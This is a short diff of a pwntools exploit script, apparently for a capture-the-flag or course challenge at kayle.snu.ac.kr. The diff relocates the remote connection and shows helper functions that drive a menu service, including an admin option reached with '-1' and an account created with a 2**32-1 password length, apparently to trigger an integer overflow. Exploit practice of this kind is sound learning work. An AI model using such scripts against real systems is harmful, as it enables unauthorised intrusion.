@@ -1,8 +1,7 @@
-#!/usr/bin/env python3
 from pwn import *
 
-# context.log_level = 'debug'
-# context.terminal = ['tmux', 'splitw', '-h']
+port = 10036
+rem = remote("kayle.snu.ac.kr", port)
 
 def create_account(username, pw_len, pw, memo):
     rem.sendlineafter(b"> ", b"1")
@@ -28,9 +27,6 @@ def logout():
 
 def admin():
     rem.sendlineafter(b"> ", b"-1")
-
-port = 10036
-rem = remote("kayle.snu.ac.kr", port)
 
 create_account(b"AAAA", 2**32-1, b"AAAA", b"MMMM")
 create_account(b"BBBB", 16, b"BBBB", b"MMMM")
